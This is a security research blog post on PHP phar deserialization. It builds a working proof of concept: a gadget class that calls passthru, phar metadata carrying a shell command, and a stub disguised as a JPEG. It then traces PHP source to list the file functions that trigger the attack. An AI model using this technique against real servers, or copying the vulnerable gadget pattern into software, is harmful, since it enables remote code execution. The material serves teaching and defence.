+++
title = "Unserialize without unserialize()"
description = "This problem occurs when user input is passed directly to unserialize() function. We will learn how to invoke deserialization without using unserialize() function."
date = 2023-05-03T16:47:01+08:00
draft = false
tags = [ "php", "web hacking", "php internal", "deserialization" ]
weight = 2
+++

## Introduction

Deserialization vulnerability has been around for a long time especially in php, java and .NET framework. The research community has been interested in deserialization vulnerability for more a decade now. Since [Stefan Essar](https://owasp.org/www-pdf-archive/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf) originally detailed the possibility of unserializing data controlled by attackers in PHP in 2009, the topic has gained widespread awareness. Thus, new attack chains emerge each year, utilising these flaws in programming languages such as Java and C#.

At Blackhat US-18, Sam Thomas introduced a [new way to exploit these vulnerability in PHP](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf).

Previouly, `php://` wrapper has been used for LFI and XXE attack either by directly access the input stream such as `php://input` or manipulate the value like `php://filter/convert.base64-encode/resource=config.php`. Based on Sam Thomas paper, we can abuse `phar://` stream wrapper when performing read/write/delete/rename operation on PHAR files to invoke deserialization. From here, it opens the door to POP ([Property Oriented Programming](https://owasp.org/www-pdf-archive/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf)) attacks, in which the attacker alters object properties to control the application's logic flow, ultimately resulting in code execution.


## What is phar archives

Before dive into technical explaination, it is better for us to understand the concept of phar. What is Phar anyway?

So for simple distribution and installation, the phar extension provides capability to compile entire PHP aplications into a single file called a `phar` (PHP archive). Hence, a phar archive offers a way to deliver a full PHP aplication in a single file and run it directly from that file without the requirements for file extraction. For more in-depth explanation on phar description from php, click this [link](https://www.php.net/manual/en/intro.phar.php).

{{< figure src="/img/posts/unserialize_without_unserialize/1.png" caption="Figure 1: Phar description" width="80%" align="center" >}}

---

### Phar archives structure

A valid phar archive have [four sections](https://www.php.net/manual/en/phar.fileformat.ingredients.php), the last one is optional:
- [a stub](https://www.php.net/manual/en/phar.fileformat.stub.php)

    A phar's stub is a simple PHP file. It must contain as a minimum, the `HALT_COMPILER();` at the end. For example, `<?php echo "this is a stub";__HALT_COMPILER(); ?>`. Noted that there cannot be more than one space between semicolon `;` and closing tag `?>`. For example, `__HALT_COMPILER();   ?>`.

    Method to [set stub](https://www.php.net/manual/en/phar.setstub.php) is:

    ```php
    Phar::setStub(string $stub)
    ```

    Stub section can be useful to disguise as jpeg/png image file. Since the minimum is `__HALT_COMPILER();`, anything before it including gibberish character is considered valid. Lets inject image data to the stub.

    ```bash
    ❯ convert -size 32x32 xc:white empty.jpg # create a 32x32 image with a white background as jpeg
    ❯ convert -size 32x32 xc:transparent empty.png # create a 32x32 image with a transparent background as png
    ❯ xxd -p empty.jpg | tr -d '\n' | sed 's/\(..\)/\\x\1/g' # extract jpeg file in hex
    \xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x02\x02\x02\x03\x03\x03\x03\x04\x06\x04\x04\x04\x04\x04\x08\x06\x06\x05\x06\x09\x08\x0a\x0a\x09\x08\x09\x09\x0a\x0c\x0f\x0c\x0a\x0b\x0e\x0b\x09\x09\x0d\x11\x0d\x0e\x0f\x10\x10\x11\x10\x0a\x0c\x12\x13\x12\x10\x13\x0f\x10\x10\x10\xff\xc0\x00\x0b\x08\x00\x20\x00\x20\x01\x01\x11\x00\xff\xc4\x00\x15\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00\xaa\x60\x00\x00\x00\x3f\xff\xd9
    ```
    In php:
    ```php
    $jpeg_header = "\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x02\x02\x02\x03\x03\x03\x03\x04\x06\x04\x04\x04\x04\x04\x08\x06\x06\x05\x06\x09\x08\x0a\x0a\x09\x08\x09\x09\x0a\x0c\x0f\x0c\x0a\x0b\x0e\x0b\x09\x09\x0d\x11\x0d\x0e\x0f\x10\x10\x11\x10\x0a\x0c\x12\x13\x12\x10\x13\x0f\x10\x10\x10\xff\xc0\x00\x0b\x08\x00\x20\x00\x20\x01\x01\x11\x00\xff\xc4\x00\x15\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00\xaa\x60\x00\x00\x00\x3f\xff\xd9";
    $poc->setStub($jpeg_header . " __HALT_COMPILER();");

- [a manifest describing the contents](https://www.php.net/manual/en/phar.fileformat.phar.php)

    Manifest stores the essential details of what is contained in the phar archives. It consists of fixed length segments, in addition to pairs of length specifications followed by variable length segment. The most important thing is in basic file format of a phar archive manifest is there is a user-defined metadata and it must be in ***serialize*** format. This means the entry point for deserializing a phar archive is by manipulating manifest metadata.

    {{< figure src="/img/posts/unserialize_without_unserialize/2.png" caption="Figure 2: Phar manifest structure" width="75%" align="center" >}}
    <p align="center"><i>Figure 2: Phar manifest structure</i></p>

    Method to [set metadata](https://www.php.net/manual/en/phar.setmetadata.php) is:
    ```php
    Phar::setMetadata(mixed $metadata)
    ```

- [the file contents](https://www.php.net/manual/en/phar.fileformat.manifestfile.php)

    Simply the original files that are included in the archive. To [add file from the file system](https://www.php.net/manual/en/phar.addfile.php), use `Phar::addFile(string $filename)`. To [add file from a string](https://www.php.net/manual/en/phar.addfromstring.php), use `Phar::addFromString(string $localName, string $contents)` instead.
    ```php
    Phar::addFile(string $filename); // add file from file system
    Phar::addFromString(string $localName, string $contents); // add file from a string
    ```

- [a signature for verifying phar integrity (file format only)](https://www.php.net/manual/en/phar.fileformat.signature.php)

    The signature of a phar is always added at the end of the phar archive, following by the loader, manifest, and file contents. The signature is added automatically when creating a phar programmatically.

    Keep in mind that SHA1 is the default signature type for all executable phar archives. Phar's signature can be set to different algorithm such as `Phar::MD5, Phar::SHA1, Phar::SHA256, Phar::SHA512, Phar::OPENSSL`. In order to [set different signature algorithm](https://www.php.net/manual/en/phar.setsignaturealgorithm.php), use this:
    ```php
    Phar::setSignatureAlgorithm(int $algo, ?string $privateKey = null)
    ```

## How to use phar archive

Here is the example of vulnerable php application. Basically, this application will receive input from the user and check if it exists or not.
```php {linenos=true}
<?php //File: index.php

class VulnerableClass {
    public $fileName;
    public $callback;

    function __destruct() {
        call_user_func($this->callback, $this->fileName);
    }
}

$file = $argv[1];

if(file_exists($file)) {
    echo "File is exists";
}
```

Here is the example of creating phar archive.

```php {linenos=true}
<?php //File: create.php

class VulnerableClass { }
// Create a new instance of the Dummy class and modify its property
$dummy = new VulnerableClass();
$dummy->callback = "passthru";
$dummy->fileName = "uname -a > pwned"; //our payload

// Delete any existing PHAR archive with that name
@unlink("poc.phar");

// Create a new archive
$poc = new Phar("poc.phar");

// Add all write operations to a buffer, without modifying the archive on disk
$poc->startBuffering();

// Set the stub
$poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");

// Add a new file in the archive with "text" as its content
$poc["file1"] = "text";
$poc["file2"] = "another Text";
// Add the dummy object to the metadata. This will be serialized
$poc->setMetadata($dummy);

// Stop buffering and write changes to disk
$poc->stopBuffering();
?>
```

Then generate phar archive like so.

```bash
❯ ls
create.php  index.php

❯ php --define phar.readonly=0 create.php

❯ ls
create.php  index.php  poc.phar
```

{{< figure src="/img/posts/unserialize_without_unserialize/3.png" caption="Figure 3: Phar hexdump" width="100%" align="center" >}}

Figure 3 shows the hex version of generated phar file from `xxd`. As you can see on Figure 3, after generating phar archive, some of manifest content is in serialized format, which is what stated in the previous manifest metadata part. Now let run the `index.php` vulnerable application.

```bash
❯ ls
create.php  index.php  poc.phar

❯ php index.php phar://./poc.phar
File is exists

❯ ls
create.php  index.php  poc.phar  pwned

❯ cat pwned
Linux nightfury99-MS-XXXX x.xX.0-XX-generic #xx~xx.Xx.X-Ubuntu SMP PREEMPT_DYNAMIC XXX Apr 18 17:40:00 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

`pwned` file was created after passing `phar://./poc.phar` with `phar://` stream wrapper to `file_exists()` function. We already aware about serialized data on phar manifest, and it will deserialized the metadata whenever `phar://` wrapper is used, but how?

## How Phar can unserialize?

In Sam Thomas paper, he points out that
>meta-data is unserialized when a Phar archive is first accessed by ***any(!) file operation***. This opens the door to unserialization attacks whenever a file operation occurs on a path whose beginning is controlled by an attacker.

Based on [php documentation](https://www.php.net/manual/en/phar.using.intro.php#:~:text=The%20phar%20stream%20wrapper%20allows,on%20both%20files%20and%20directories.), phar stream wrapper allow accessing files within a phar archieve using PHP's standard file functions such as `fopen(), readfile()`. In shorts, any PHP's function that involves with filesystem functions can use phar stream wrapper. The majority of PHP filesystem functions will deserialize metadata when parsing phar file with `phar://` stream wrapper. [Seaii from **Chuangyu 404 Lab**](https://paper.seebug.org/680/) conclude the affected function as follows:

|                  |              |             |                  |
|:-----------------:|:-------------:|:------------:|:-----------------:|
| fileatime         |  filectime    | file_exists  | file_get_contents |
| file_put_contents |    file       | filegroup    | fopen             |
| fileinode         | filemtime     | fileowner    | fileperms         |
| is_dir            | is_executable | is_file      | is_link           |
| is_readable       | is_writable   | is_writeable | parse_ini_file    |
| copy              | unlink        | stat         | readfile          |

One of the reason why phar metadata can be unserialize is because it called `php_var_unserialize(...)` at `./ext/phar/phar.c` on line 621.

{{< highlight c "linenos=true,hl_lines=13,linenostart=609" >}}
//File: ./ext/phar/phar.c
int phar_parse_metadata(char **buffer, zval *metadata, uint32_t zip_metadata_len) /* {{{ */
{
    php_unserialize_data_t var_hash;

    if (zip_metadata_len) {
        const unsigned char *p;
        unsigned char *p_buff = (unsigned char *)estrndup(*buffer, zip_metadata_len);
        p = p_buff;
        ZVAL_NULL(metadata);
        PHP_VAR_UNSERIALIZE_INIT(var_hash);

        if (!php_var_unserialize(metadata, &p, p + zip_metadata_len, &var_hash)) {
            efree(p_buff);
            PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
            zval_ptr_dtor(metadata);
            ZVAL_UNDEF(metadata);
            return FAILURE;
        }
        efree(p_buff);
        PHP_VAR_UNSERIALIZE_DESTROY(var_hash);

        if (PHAR_G(persist)) {
            /* lazy init metadata */
            zval_ptr_dtor(metadata);
            Z_PTR_P(metadata) = pemalloc(zip_metadata_len, 1);
            memcpy(Z_PTR_P(metadata), *buffer, zip_metadata_len);
            return SUCCESS;
        }
    } else {
        ZVAL_UNDEF(metadata);
    }

    return SUCCESS;
}
{{</ highlight >}}

Let investigate why only certain function can be use to invoke deserialization but first, let me introduce to you with stream API.

---

### Stream API

A uniform approach to the processing of files and sockets in PHP extensions is introduced via the [***PHP Streams API***](http://php.adamharvey.name/manual/en/internals2.ze1.streams.php). The Streams API aims to provide developers with an intuitive, uniform API that makes it easy for them to open files, URLs, and other streamable data sources. Streams use a `php_stream*` parameter just as ANSI stdio (fread etc.) use a `FILE*` parameter.

In most cases, you will use `php_stream_open_wrapper( )` to obtain the stream handle. This function works very much like `fopen( )`. `php_stream_open_wrapper( )` and `php_stream_open_wrapper_ex( )` almost the same thing, both call `_php_stream_open_wrapper_ex`. The only difference is `_php_stream_open_wrapper_ex( )` has extra parameter for context as can be seen from the `php_streams.h` file below.

{{< highlight C "linenos=true,linenostart=567" >}}
//File: ./main/php_streams.h
PHPAPI php_stream *_php_stream_open_wrapper_ex(const char *path, const char *mode, int options, zend_string **opened_path, php_stream_context *context STREAMS_DC);
PHPAPI php_stream_wrapper *php_stream_locate_url_wrapper(const char *path, const char **path_for_open, int options);
PHPAPI const char *php_stream_locate_eol(php_stream *stream, zend_string *buf);

#define php_stream_open_wrapper(path, mode, options, opened)    _php_stream_open_wrapper_ex((path), (mode), (options), (opened), NULL STREAMS_CC)
#define php_stream_open_wrapper_ex(path, mode, options, opened, context)    _php_stream_open_wrapper_ex((path), (mode), (options), (opened), (context) STREAMS_CC)
{{</ highlight >}}

Example how to return stream from a function.

```c
PHP_FUNCTION(example_open_php_home_page)
{
    php_stream *stream;

    stream = php_stream_open_wrapper("http://www.php.net", "rb", REPORT_ERRORS, NULL);

    php_stream_to_zval(stream, return_value);

    /* after this point, the stream is "owned" by the script.
        If you close it now, you will crash PHP! */
}
```
The table below shows the Streams equivalents of the more common ANSI stdio functions.

| ANSI Stdio Function | PHP Streams Function    | Notes                                   |
| ------------------- | :---------------------- | :-------------------------------------- |
| fopen               | php_stream_open_wrapper | Streams includes additional parameters  |
| fclose              | php_stream_close        |   |
| fgets               | php_stream_gets         |   |
| fread               | php_stream_read         | The nmemb parameter is assumed to have a value of 1, so the prototype looks more like read(2)  |
| fwrite              | php_stream_write        | The nmemb parameter is assumed to have a value of 1, so the prototype looks more like write(2)  |
| fseek               | php_stream_seek         |   |
| ftell               | php_stream_tell         |   |
| rewind              | php_stream_rewind       |   |
| feof                | php_stream_eof          |   |
| fgetc               | php_stream_getc         |   |
| fputc               | php_stream_putc         |   |
| fflush              | php_stream_flush        |   |
| puts                | php_stream_puts         | Same semantics as puts, NOT fputs  |
| fstat               | php_stream_stat         | Streams has a richer stat structure  |

Lets take a php function like `file_get_contents( )` and analyze. Imagine `file_get_contents( )` is executed like this:

```php
<?php
    $file = file_get_contents("phar://poc.phar");
?>
```

As shown as below, `file_get_contents` call `php_stream_open_wrapper_ex` to open the provided file as a stream.

{{< highlight c "linenos=true,linenostart=524,hl_lines=31-33" >}}
// File: ./ext/standard/file.c
PHP_FUNCTION(file_get_contents)
{
	char *filename;
	size_t filename_len;
	zend_bool use_include_path = 0;
	php_stream *stream;
	zend_long offset = 0;
	zend_long maxlen = (ssize_t) PHP_STREAM_COPY_ALL;
	zval *zcontext = NULL;
	php_stream_context *context = NULL;
	zend_string *contents;

	/* Parse arguments */
	ZEND_PARSE_PARAMETERS_START(1, 5)
		Z_PARAM_PATH(filename, filename_len)
		Z_PARAM_OPTIONAL
		Z_PARAM_BOOL(use_include_path)
		Z_PARAM_RESOURCE_EX(zcontext, 1, 0)
		Z_PARAM_LONG(offset)
		Z_PARAM_LONG(maxlen)
	ZEND_PARSE_PARAMETERS_END();

	if (ZEND_NUM_ARGS() == 5 && maxlen < 0) {
		php_error_docref(NULL, E_WARNING, "length must be greater than or equal to zero");
		RETURN_FALSE;
	}

	context = php_stream_context_from_zval(zcontext, 0);

	stream = php_stream_open_wrapper_ex(filename, "rb",
				(use_include_path ? USE_PATH : 0) | REPORT_ERRORS,
				NULL, context);
	if (!stream) {
		RETURN_FALSE;
	}

	if (offset != 0 && php_stream_seek(stream, offset, ((offset > 0) ? SEEK_SET : SEEK_END)) < 0) {
		php_error_docref(NULL, E_WARNING, "Failed to seek to position " ZEND_LONG_FMT " in the stream", offset);
		php_stream_close(stream);
		RETURN_FALSE;
	}

	if ((contents = php_stream_copy_to_mem(stream, maxlen, 0)) != NULL) {
		RETVAL_STR(contents);
	} else {
		RETVAL_EMPTY_STRING();
	}

	php_stream_close(stream);
}
{{</ highlight >}}

Then `_php_stream_open_wrapper_ex` call `php_stream_locate_url_wrapper` to find provided wrapper.

{{< highlight c "linenos=true,linenostart=2077,hl_lines=36" >}}
// File: ./main/streams/streams.c
PHPAPI php_stream *_php_stream_open_wrapper_ex(const char *path, const char *mode, int options,
		zend_string **opened_path, php_stream_context *context STREAMS_DC)
{
	php_stream *stream = NULL;
	php_stream_wrapper *wrapper = NULL;
	const char *path_to_open;
	int persistent = options & STREAM_OPEN_PERSISTENT;
	zend_string *resolved_path = NULL;
	char *copy_of_path = NULL;

	if (opened_path) {
		*opened_path = NULL;
	}

	if (!path || !*path) {
		php_error_docref(NULL, E_WARNING, "Filename cannot be empty");
		return NULL;
	}

	if (options & USE_PATH) {
		resolved_path = zend_resolve_path(path, strlen(path));
		if (resolved_path) {
			path = ZSTR_VAL(resolved_path);
			/* we've found this file, don't re-check include_path or run realpath */
			options |= STREAM_ASSUME_REALPATH;
			options &= ~USE_PATH;
		}
		if (EG(exception)) {
			return NULL;
		}
	}

	path_to_open = path;

	wrapper = php_stream_locate_url_wrapper(path, &path_to_open, options);
	if (options & STREAM_USE_URL && (!wrapper || !wrapper->is_url)) {
		php_error_docref(NULL, E_WARNING, "This function may only be used against URLs");
		if (resolved_path) {
			zend_string_release_ex(resolved_path, 0);
		}
		return NULL;
	}

	if (wrapper) {
		if (!wrapper->wops->stream_opener) {
			php_stream_wrapper_log_error(wrapper, options ^ REPORT_ERRORS,
					"wrapper does not support stream open");
		} else {
			stream = wrapper->wops->stream_opener(wrapper,
				path_to_open, mode, options ^ REPORT_ERRORS,
				opened_path, context STREAMS_REL_CC);
		}
{{</ highlight >}}

On line **2112**, php try to find wrapper from provided path (in this case "phar://poc.phar") using `php_stream_locate_url_wrapper`. We can use `stream_get_wrappers` to see which wrappers are registered in the system.

```php
php > var_dump(stream_get_wrappers());
array(11) {
  [0] =>
  string(5) "https"
  [1] =>
  string(4) "ftps"
  [2] =>
  string(13) "compress.zlib"
  [3] =>
  string(3) "php"
  [4] =>
  string(4) "file"
  [5] =>
  string(4) "glob"
  [6] =>
  string(4) "data"
  [7] =>
  string(4) "http"
  [8] =>
  string(3) "ftp"
  [9] =>
  string(4) "phar"
  [10] =>
  string(3) "zip"
}
```

There are 11 registered wrappers and phar is one of it. So, what functions can be achieved by registering a stream wrapper generally? Below is how stream wrapper defined its components.

{{< highlight c "linenos=true,linenostart=131" >}}
// File: ./main/php_streams.h
typedef struct _php_stream_wrapper_ops {
	/* open/create a wrapped stream */
	php_stream *(*stream_opener)(php_stream_wrapper *wrapper, const char *filename, const char *mode,
			int options, zend_string **opened_path, php_stream_context *context STREAMS_DC);
	/* close/destroy a wrapped stream */
	int (*stream_closer)(php_stream_wrapper *wrapper, php_stream *stream);
	/* stat a wrapped stream */
	int (*stream_stat)(php_stream_wrapper *wrapper, php_stream *stream, php_stream_statbuf *ssb);
	/* stat a URL */
	int (*url_stat)(php_stream_wrapper *wrapper, const char *url, int flags, php_stream_statbuf *ssb, php_stream_context *context);
	/* open a "directory" stream */
	php_stream *(*dir_opener)(php_stream_wrapper *wrapper, const char *filename, const char *mode,
			int options, zend_string **opened_path, php_stream_context *context STREAMS_DC);

	const char *label;

	/* delete a file */
	int (*unlink)(php_stream_wrapper *wrapper, const char *url, int options, php_stream_context *context);

	/* rename a file */
	int (*rename)(php_stream_wrapper *wrapper, const char *url_from, const char *url_to, int options, php_stream_context *context);

	/* Create/Remove directory */
	int (*stream_mkdir)(php_stream_wrapper *wrapper, const char *url, int mode, int options, php_stream_context *context);
	int (*stream_rmdir)(php_stream_wrapper *wrapper, const char *url, int options, php_stream_context *context);
	/* Metadata handling */
	int (*stream_metadata)(php_stream_wrapper *wrapper, const char *url, int options, void *value, php_stream_context *context);
} php_stream_wrapper_ops;
{{</ highlight >}}

Since we are using phar stream wrapper, let see how phar register its component.

{{< highlight c "linenos=true,linenostart=36" >}}
// File: ./ext/phar/stream.c
const php_stream_wrapper_ops phar_stream_wops = {
	phar_wrapper_open_url,
	NULL,                  /* phar_wrapper_close */
	NULL,                  /* phar_wrapper_stat, */
	phar_wrapper_stat,     /* stat_url */
	phar_wrapper_open_dir, /* opendir */
	"phar",
	phar_wrapper_unlink,   /* unlink */
	phar_wrapper_rename,   /* rename */
	phar_wrapper_mkdir,    /* create directory */
	phar_wrapper_rmdir,    /* remove directory */
	NULL
};
{{</ highlight >}}

Based on the struct defined at `./main/php_streams.h` and `./ext/phar/stream.c`, we found that phar stream wrapper support the following functions:
- open/create a URL
- stat URL
- open directory
- unlink a file
- rename a file
- create directory
- remove directory

After getting phar stream wrapper via `php_stream_locate_url_wrapper` method, php then try to access `stream_opener` method from wrapper object at `./main/streams/streams.c` on line **2126**. Phar register `stream_opener` as `phar_wrapper_open_url`, thus, it will invoke `phar_wrapper_open_url()` function. The whole chain will eventually call `php_var_unserialize`. Figure 5 shows example for `file_get_contents()`, `rename()`, `mkdir()`, and `unlink()` function's call.

{{< figure src="/img/posts/unserialize_without_unserialize/4.png" caption="Figure 4: Phar deserialization flow overview" width="100%" align="center" >}}


## Hunting other functions

Knowing a few affected function is sufficient, right? Naturally, is is inadequate. To go farther, we must first determine its underlying premise. All of the files are considered to be usable and certain php extension already identified as vulnerable to deserialization such as:

### exif
- `exif_thumbnail`
- `exif_imagetype`

### gd
- `imageloadfont`
- `imagecreatefrom***`

### hash
- `hash_hmac_file`
- `hash_file`
- `hash_update_file`
- `md5_file`
- `sha1_file`

### file/url
- `get_meta_tags`
- `get_headers`

### zip
```php
$zip = new ZipArchive();
$res = $zip->open('c.zip');
$zip->extractTo('phar://poc.phar/poc');
```

---

## Summary

Actually there are still many vulnerable functions(such as simplexml, postgres ext, bzip/gzip and mysql) but I leave it to you guys for digging as exercises. Now you already know why phar can leads to deserialization, the root cause for "phar deserialization" and in terms of stream wrapper exploitation, this is merely a preliminary step(but still a good start).

## References
* https://paper.seebug.org/680/
* https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability
* https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf
* https://blog.zsxsoft.com/post/38
